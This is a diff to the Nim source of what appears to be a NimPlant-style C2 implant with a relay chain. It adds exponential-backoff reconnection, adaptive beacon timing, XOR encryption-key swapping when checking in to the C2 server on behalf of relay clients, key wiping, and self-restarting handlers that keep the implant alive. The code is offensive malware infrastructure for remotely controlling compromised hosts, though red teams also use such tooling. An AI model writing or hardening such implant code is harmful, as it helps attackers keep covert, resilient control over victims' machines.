@@ -79,6 +79,77 @@ else:
 var g_serverFastMode* = false  # Server adapts to client mode dynamically
 var g_adaptiveMaxSleep* = 2000  # Default 2 seconds, adapts to client
 
+# Reconnection management to prevent infinite loops
+type
+    ReconnectionManager* = object
+        attempts*: int
+        lastAttemptTime*: int64
+        maxAttempts*: int
+        baseDelay*: int  # milliseconds
+        maxDelay*: int   # milliseconds
+        backoffMultiplier*: float
+
+var g_reconnectionManager*: ReconnectionManager = ReconnectionManager(
+    attempts: 0,
+    lastAttemptTime: 0,
+    maxAttempts: 10,  # Max 10 attempts before giving up
+    baseDelay: 2000,  # Start with 2 seconds
+    maxDelay: 300000, # Max 5 minutes delay
+    backoffMultiplier: 2.0  # Double delay each time
+)
+
+proc canAttemptReconnection*(): bool =
+    ## Check if we can attempt reconnection based on backoff policy
+    let currentTime = epochTime().int64
+    
+    # Reset attempts if enough time has passed (1 hour cooldown)
+    if currentTime - g_reconnectionManager.lastAttemptTime > 3600:
+        g_reconnectionManager.attempts = 0
+        when defined debug:
+            echo "[RECONNECT] 🔄 Attempt counter reset after 1 hour cooldown"
+    
+    # Check if we've exceeded max attempts
+    if g_reconnectionManager.attempts >= g_reconnectionManager.maxAttempts:
+        when defined debug:
+            echo "[RECONNECT] 🚨 Max reconnection attempts exceeded (" & $g_reconnectionManager.maxAttempts & ")"
+            echo "[RECONNECT] 🚨 Entering long cooldown period"
+        return false
+    
+    return true
+
+proc getReconnectionDelay*(): int =
+    ## Calculate exponential backoff delay for reconnection
+    let baseDelay = float(g_reconnectionManager.baseDelay)
+    let multiplier = pow(g_reconnectionManager.backoffMultiplier, float(g_reconnectionManager.attempts))
+    let delay = int(baseDelay * multiplier)
+    
+    # Apply max delay cap
+    result = min(delay, g_reconnectionManager.maxDelay)
+    
+    when defined debug:
+        echo "[RECONNECT] 📊 Backoff calculation:"
+        echo "[RECONNECT] 📊 - Attempt: " & $g_reconnectionManager.attempts
+        echo "[RECONNECT] 📊 - Base delay: " & $baseDelay.int & "ms"
+        echo "[RECONNECT] 📊 - Multiplier: " & $multiplier
+        echo "[RECONNECT] 📊 - Calculated delay: " & $delay & "ms"
+        echo "[RECONNECT] 📊 - Final delay (capped): " & $result & "ms"
+
+proc recordReconnectionAttempt*() =
+    ## Record a reconnection attempt for backoff tracking
+    g_reconnectionManager.attempts += 1
+    g_reconnectionManager.lastAttemptTime = epochTime().int64
+    
+    when defined debug:
+        echo "[RECONNECT] 📈 Recorded attempt #" & $g_reconnectionManager.attempts & "/" & $g_reconnectionManager.maxAttempts
+
+proc resetReconnectionManager*() =
+    ## Reset reconnection manager after successful connection
+    g_reconnectionManager.attempts = 0
+    g_reconnectionManager.lastAttemptTime = epochTime().int64
+    
+    when defined debug:
+        echo "[RECONNECT] ✅ Reconnection manager reset after successful connection"
+
 # Network Adaptive Throttling System
 type
     NetworkHealth* = object
@@ -96,7 +167,7 @@ var g_networkHealth*: NetworkHealth = NetworkHealth(
     adaptiveMultiplier: 1.0
 )
 
-# Measure network latency and adjust throttling
+# Enhanced network health management with safety margins
 proc updateNetworkHealth*(startTime: float, success: bool) =
     let currentTime = epochTime()
     
@@ -112,10 +183,13 @@ proc updateNetworkHealth*(startTime: float, success: bool) =
         g_networkHealth.consecutiveErrors = 0
         g_networkHealth.lastSuccessTime = currentTime.int64
         
+        # SAFETY MARGIN: Reset multiplier gradually when network improves
+        let oldMultiplier = g_networkHealth.adaptiveMultiplier
+        
         # Determine if network is slow (RTT > 200ms)
         g_networkHealth.isSlowNetwork = g_networkHealth.rtt > 200.0
         
-        # Calculate adaptive multiplier based on network conditions
+        # Calculate adaptive multiplier based on network conditions with safety margins
         if g_networkHealth.rtt > 500.0:
             g_networkHealth.adaptiveMultiplier = 4.0  # Very slow network
         elif g_networkHealth.rtt > 200.0:
@@ -123,7 +197,13 @@ proc updateNetworkHealth*(startTime: float, success: bool) =
         elif g_networkHealth.rtt > 100.0:
             g_networkHealth.adaptiveMultiplier = 1.5  # Medium network
         else:
-            g_networkHealth.adaptiveMultiplier = 1.0  # Fast network
+            # SAFETY MARGIN: Gradual reduction instead of immediate reset
+            if oldMultiplier > 1.0:
+                g_networkHealth.adaptiveMultiplier = max(1.0, oldMultiplier * 0.8)  # 20% reduction per success
+                when defined debug:
+                    echo "[DEBUG] 🌐 ⚡ Gradual multiplier reduction: " & $oldMultiplier & " → " & $g_networkHealth.adaptiveMultiplier
+            else:
+                g_networkHealth.adaptiveMultiplier = 1.0  # Fast network
         
         when defined debug:
             echo "[DEBUG] 🌐 Network Health Updated - RTT: " & $g_networkHealth.rtt.int & "ms, Multiplier: " & $g_networkHealth.adaptiveMultiplier & ", Raw RTT: " & $validRtt.int & "ms"
@@ -131,26 +211,65 @@ proc updateNetworkHealth*(startTime: float, success: bool) =
         # Network error - increase consecutive errors and implement exponential backoff
         g_networkHealth.consecutiveErrors += 1
         let errorMultiplier = min(pow(2.0, float(g_networkHealth.consecutiveErrors)), 8.0)  # Max 8x backoff
-        g_networkHealth.adaptiveMultiplier = max(g_networkHealth.adaptiveMultiplier, errorMultiplier)
+        
+        # SAFETY MARGIN: Don't let error multiplier override good RTT-based multiplier
+        let rttBasedMultiplier = if g_networkHealth.rtt > 500.0: 4.0
+                                elif g_networkHealth.rtt > 200.0: 2.0
+                                elif g_networkHealth.rtt > 100.0: 1.5
+                                else: 1.0
+        
+        # Use the higher of error-based or RTT-based multiplier
+        g_networkHealth.adaptiveMultiplier = max(rttBasedMultiplier, errorMultiplier)
         
         when defined debug:
-            echo "[DEBUG] 🚨 Network Error - Consecutive: " & $g_networkHealth.consecutiveErrors & ", Multiplier: " & $g_networkHealth.adaptiveMultiplier
+            echo "[DEBUG] 🚨 Network Error - Consecutive: " & $g_networkHealth.consecutiveErrors & ", Error Multiplier: " & $errorMultiplier & ", RTT Multiplier: " & $rttBasedMultiplier & ", Final: " & $g_networkHealth.adaptiveMultiplier
 
-# Get adaptive polling interval based on network conditions
+# SAFETY RESET: Force reset of network health after extended periods
+proc resetNetworkHealthIfStuck*() =
+    let currentTime = epochTime().int64
+    let timeSinceLastUpdate = currentTime - g_networkHealth.lastSuccessTime
+    
+    # If no success for 5 minutes and multiplier is high, force reset
+    if timeSinceLastUpdate > 300 and g_networkHealth.adaptiveMultiplier > 2.0:
+        when defined debug:
+            echo "[DEBUG] 🔄 SAFETY RESET: Network health stuck for " & $timeSinceLastUpdate & "s"
+            echo "[DEBUG] 🔄 Old state - RTT: " & $g_networkHealth.rtt.int & "ms, Multiplier: " & $g_networkHealth.adaptiveMultiplier & ", Errors: " & $g_networkHealth.consecutiveErrors
+        
+        # Gradual reset instead of immediate
+        g_networkHealth.adaptiveMultiplier = max(1.5, g_networkHealth.adaptiveMultiplier * 0.5)  # Half the multiplier
+        g_networkHealth.consecutiveErrors = max(0, g_networkHealth.consecutiveErrors - 2)  # Reduce errors by 2
+        g_networkHealth.rtt = min(g_networkHealth.rtt, 100.0)  # Cap RTT at reasonable value
+        
+        when defined debug:
+            echo "[DEBUG] 🔄 New state - RTT: " & $g_networkHealth.rtt.int & "ms, Multiplier: " & $g_networkHealth.adaptiveMultiplier & ", Errors: " & $g_networkHealth.consecutiveErrors
+            echo "[DEBUG] 🔄 ✅ Network health safety reset completed"
+
+# Get adaptive polling interval based on network conditions with safety bounds
 proc getAdaptivePollingInterval*(): int =
+    # SAFETY CHECK: Reset network health if stuck
+    resetNetworkHealthIfStuck()
+    
     let baseInterval = if CLIENT_FAST_MODE: 1000 else: 2000
     let adaptiveInterval = int(float(baseInterval) * g_networkHealth.adaptiveMultiplier)
     
-    # Ensure reasonable bounds (min 500ms, max 30s)
-    return min(max(adaptiveInterval, 500), 30000)
+    # ENHANCED SAFETY BOUNDS: Stricter limits to prevent extreme delays
+    result = min(max(adaptiveInterval, 500), 20000)  # Max 20s instead of 30s
+    
+    when defined(debug):
+        if result != adaptiveInterval:
+            echo "[DEBUG] 🛡️  SAFETY BOUND APPLIED: Requested " & $adaptiveInterval & "ms, capped to " & $result & "ms"
 
-# Get adaptive timeout based on network conditions  
+# Get adaptive timeout based on network conditions with safety bounds
 proc getAdaptiveTimeout*(): int =
     let baseTimeout = if g_networkHealth.isSlowNetwork: 200 else: 100
     let adaptiveTimeout = int(float(baseTimeout) * g_networkHealth.adaptiveMultiplier)
     
-    # Ensure reasonable bounds (min 50ms, max 5s)
-    return min(max(adaptiveTimeout, 50), 5000)
+    # ENHANCED SAFETY BOUNDS: Stricter timeout limits
+    result = min(max(adaptiveTimeout, 50), 3000)  # Max 3s instead of 5s
+    
+    when defined(debug):
+        if result != adaptiveTimeout:
+            echo "[DEBUG] 🛡️  TIMEOUT SAFETY BOUND: Requested " & $adaptiveTimeout & "ms, capped to " & $result & "ms"
 
 # Connect to upstream relay
 proc connectToUpstreamRelay(host: string, port: int): string =
@@ -222,6 +341,29 @@ proc connectToUpstreamRelay(host: string, port: int): string =
         return "Error connecting to upstream relay: " & e.msg
 
 # processRelayCommand is now imported from modules/relay/relay_commands
+
+# Safe encryption key management to prevent desync cascade
+proc safeKeySwap(listener: var Listener, newKey: string): string =
+    ## Safely swap encryption keys with atomic rollback protection
+    let originalKey = listener.UNIQUE_XOR_KEY
+    listener.UNIQUE_XOR_KEY = newKey
+    return originalKey
+
+proc safeKeyRestore(listener: var Listener, originalKey: string) =
+    ## Safely restore original encryption key
+    listener.UNIQUE_XOR_KEY = originalKey
+    when defined debug:
+        echo "[KEY] 🔑 Encryption key restored safely"
+
+proc clearSensitiveKey(key: var string) =
+    ## Securely clear encryption key from memory
+    if key != "":
+        # Overwrite with zeros before clearing
+        for i in 0..<key.len:
+            key[i] = '\0'
+        key = ""
+        when defined debug:
+            echo "[KEY] 🧹 Sensitive key cleared from memory"
 
 # Async HTTP handler - Handles C2 communication
 proc httpHandler() {.async.} =
@@ -410,9 +552,9 @@ proc httpHandler() {.async.} =
                             when defined debug:
                                 echo "[DEBUG] 💓 HTTP Handler: Performing check-in to C2 on behalf of relay client: " & msg.fromID
                             
-                            # Temporarily change listener ID and encryption key to relay client's values
+                            # SAFE KEY MANAGEMENT: Temporarily change listener ID and encryption key to relay client's values
                             let originalId = listener.id
-                            let originalKey = listener.UNIQUE_XOR_KEY
+                            var originalKey = ""  # Will be set by safeKeySwap
                             listener.id = msg.fromID
                             
                             # Extract the relay client's encryption key from the PULL payload
@@ -434,23 +576,22 @@ proc httpHandler() {.async.} =
                                     echo "[DEBUG] 🔑 INITIAL_XOR_KEY: " & $INITIAL_XOR_KEY
                                     echo "[DEBUG] 🔑 Decrypted key preview: " & relayClientKey[0..min(15, relayClientKey.len-1)] & "..."
                                 
-                                # CRITICAL: Use the relay client's encryption key for C2 communication
-                                listener.UNIQUE_XOR_KEY = relayClientKey
+                                # SAFE KEY SWAP: Use atomic key swapping to prevent desync
+                                originalKey = safeKeySwap(listener, relayClientKey)
                                 
                                 when defined debug:
-                                    echo "[DEBUG] 🔑 Using relay client encryption key for C2 communication"
+                                    echo "[DEBUG] 🔑 ✅ Safe key swap completed - using relay client encryption key"
                                     echo "[DEBUG] 🔑 Original key length: " & $originalKey.len
                                     echo "[DEBUG] 🔑 Relay client key length: " & $relayClientKey.len
-                                    echo "[DEBUG] 🔑 ✅ Key exchange completed successfully"
                                 
                             except Exception as e:
                                 when defined debug:
                                     echo "[DEBUG] ⚠️  Failed to extract/decrypt encryption key from PULL payload: " & msg.fromID
                                     echo "[DEBUG] ⚠️  Error: " & e.msg
                                     echo "[DEBUG] ⚠️  Payload: " & decryptedPayload
-                                    echo "[DEBUG] ⚠️  Using relay server's key (will likely fail)"
-                                    echo "[DEBUG] ⚠️  ❌ This will cause CHECK-IN FAILURE!"
-                                # Keep original key if decryption fails
+                                    echo "[DEBUG] ⚠️  Using relay server's key as fallback"
+                                # Keep original key if decryption fails - no key swap needed
+                                originalKey = listener.UNIQUE_XOR_KEY
                             
                             # Perform check-in to C2 for relay client using exported function
                             when defined debug:
@@ -484,15 +625,12 @@ proc httpHandler() {.async.} =
                                 if args.len > 0:
                                     echo "[DEBUG] 💓 HTTP Handler: - Args: " & $args
                             
-                            # Restore original listener ID and encryption key BEFORE processing response
+                            # SAFE KEY RESTORATION: Restore original listener ID and encryption key BEFORE processing response
                             listener.id = originalId
-                            listener.UNIQUE_XOR_KEY = originalKey
+                            safeKeyRestore(listener, originalKey)
                             
                             # SECURITY: Clear the relay client's encryption key from memory AFTER all operations
-                            if relayClientKey != "":
-                                relayClientKey = ""
-                                when defined debug:
-                                    echo "[DEBUG] 🧹 HTTP Handler: Relay client encryption key cleared from memory"
+                            clearSensitiveKey(relayClientKey)
                             
                             # CRITICAL: ALWAYS send a response to PULL requests!
                             if cmd != "" and cmd != obf("NIMPLANT_CONNECTION_ERROR"):
@@ -592,16 +730,16 @@ proc httpHandler() {.async.} =
                                 echo "[DEBUG] 🌐 HTTP Handler: Sending relay result to C2..."
                                 echo "[DEBUG] 🌐 HTTP Handler: Using cmdGuid: " & responseCmdGuid & " for client: " & msg.fromID
                             
-                            # Temporarily change listener ID and encryption key to relay client's values
+                            # SAFE KEY MANAGEMENT: Temporarily change listener ID and encryption key to relay client's values
                             let originalId = listener.id
-                            let originalKey = listener.UNIQUE_XOR_KEY
+                            var originalKey = listener.UNIQUE_XOR_KEY  # Default to current key
                             listener.id = msg.fromID
                             
                             # Use the relay client's encryption key if available
                             if relayClientKey != "":
-                                listener.UNIQUE_XOR_KEY = relayClientKey
+                                originalKey = safeKeySwap(listener, relayClientKey)
                                 when defined debug:
-                                    echo "[DEBUG] 🔑 HTTP Handler: Using relay client's encryption key for C2 result submission"
+                                    echo "[DEBUG] 🔑 ✅ Safe key swap for C2 result submission"
                             else:
                                 when defined debug:
                                     echo "[DEBUG] ⚠️  HTTP Handler: No encryption key from relay client, using relay server's key"
@@ -609,15 +747,12 @@ proc httpHandler() {.async.} =
                             # Send result to C2 with correct cmdGuid using exported function
                             webClientListener.postCommandResults(listener, responseCmdGuid, actualResult)
                             
-                            # Restore original listener ID and encryption key
+                            # SAFE KEY RESTORATION: Restore original listener ID and encryption key
                             listener.id = originalId
-                            listener.UNIQUE_XOR_KEY = originalKey
+                            safeKeyRestore(listener, originalKey)
                             
                             # SECURITY: Clear the relay client's encryption key from memory
-                            if relayClientKey != "":
-                                relayClientKey = ""
-                                when defined debug:
-                                    echo "[DEBUG] 🧹 HTTP Handler: Relay client encryption key cleared from memory"
+                            clearSensitiveKey(relayClientKey)
                             
                             when defined debug:
                                 echo "[DEBUG] 🌐 HTTP Handler: ✅ Relay result sent to C2"
@@ -1033,38 +1168,66 @@ proc relayClientHandler(host: string, port: int) {.async.} =
             
             await sleepAsync(adaptiveInterval)
             
-            # Check if connection is still alive and handle stuck connections
+            # SAFE RECONNECTION: Check if connection is still alive and handle stuck connections
             if not upstreamRelay.isConnected:
-                when defined debug:
-                    echo "[DEBUG] Connection lost, attempting to reconnect..."
-                await sleepAsync(RECONNECT_DELAY) # Optimized reconnect delay
-                let reconnectResult = connectToUpstreamRelay(host, port)
-                when defined debug:
-                    echo "[DEBUG] Reconnection result: " & reconnectResult
-            
-            # ANTI-STUCK PROTECTION: Detect if network is unhealthy and force reconnection
-            elif g_networkHealth.consecutiveErrors > 3:
-                when defined debug:
-                    echo "[DEBUG] 🚨 Network is unhealthy (errors: " & $g_networkHealth.consecutiveErrors & "), forcing reconnection..."
-                
-                # Close current connection
-                if upstreamRelay.isConnected:
-                    upstreamRelay.isConnected = false
-                
-                # Wait and reconnect
-                await sleepAsync(RECONNECT_DELAY * 2) # Longer delay for problematic networks
-                let reconnectResult = connectToUpstreamRelay(host, port)
-                when defined debug:
-                    echo "[DEBUG] Force reconnection result: " & reconnectResult
-                
-                # Reset network health after reconnection attempt
-                g_networkHealth.consecutiveErrors = 0
-                g_networkHealth.adaptiveMultiplier = 1.0
+                # Check if we can attempt reconnection (backoff protection)
+                if canAttemptReconnection():
+                    recordReconnectionAttempt()
+                    let reconnectDelay = getReconnectionDelay()
+                    
+                    when defined debug:
+                        echo "[DEBUG] 🔄 Connection lost, attempting safe reconnection..."
+                        echo "[DEBUG] 🔄 Backoff delay: " & $reconnectDelay & "ms"
+                    
+                    await sleepAsync(reconnectDelay)
+                    let reconnectResult = connectToUpstreamRelay(host, port)
+                    
+                    when defined debug:
+                        echo "[DEBUG] 🔄 Reconnection result: " & reconnectResult
+                    
+                    # Reset manager if successful
+                    if upstreamRelay.isConnected:
+                        resetReconnectionManager()
+                        when defined debug:
+                            echo "[DEBUG] ✅ Reconnection successful, backoff reset"
+                else:
+                    when defined debug:
+                        echo "[DEBUG] 🚨 Reconnection attempts exceeded, entering long cooldown"
+                    await sleepAsync(60000)  # 1 minute cooldown when max attempts reached
             
         except Exception as e:
             when defined debug:
                 echo "[DEBUG] Relay client error: " & e.msg
             await sleepAsync(ERROR_RECOVERY_SLEEP) # Optimized error recovery sleep
+
+# Safe async wrappers to prevent event loop crashes
+proc safeRelayClientHandler(host: string, port: int) {.async.} =
+    try:
+        await relayClientHandler(host, port)
+    except Exception as e:
+        when defined debug:
+            echo "[CRITICAL] 🚨 Relay client handler crashed: " & e.msg
+            echo "[CRITICAL] 🚨 Stack trace: " & e.getStackTrace()
+        # Attempt recovery after delay
+        await sleepAsync(5000)  # 5 second recovery delay
+        when defined debug:
+            echo "[RECOVERY] 🔄 Attempting to restart relay client handler"
+        # Recursive restart (with built-in exception handling)
+        asyncCheck safeRelayClientHandler(host, port)
+
+proc safeHttpHandler() {.async.} =
+    try:
+        await httpHandler()
+    except Exception as e:
+        when defined debug:
+            echo "[CRITICAL] 🚨 HTTP handler crashed: " & e.msg
+            echo "[CRITICAL] 🚨 Stack trace: " & e.getStackTrace()
+        # Attempt recovery after delay
+        await sleepAsync(5000)  # 5 second recovery delay
+        when defined debug:
+            echo "[RECOVERY] 🔄 Attempting to restart HTTP handler"
+        # Recursive restart (with built-in exception handling)
+        asyncCheck safeHttpHandler()
 
 # Main execution function
 proc runMultiImplant*() =
@@ -1128,7 +1291,7 @@ proc runMultiImplant*() =
                                 echo "[DEBUG] 📡 Listening for commands from relay server..."
                             
                             # Relay client main loop - only handle relay messages using SAFE FUNCTIONS
-                            asyncCheck relayClientHandler(host, port)
+                            asyncCheck safeRelayClientHandler(host, port)
                             
                             # Run the async event loop
                             runForever()
@@ -1162,7 +1325,7 @@ proc runMultiImplant*() =
             echo "[DEBUG] ℹ️  Relay server will start when 'relay port' command is executed"
         
         # Start only HTTP handler - relay server starts via command
-        asyncCheck httpHandler()
+        asyncCheck safeHttpHandler()
         
         when defined debug:
             echo "[DEBUG] ✅ HTTP handler started"
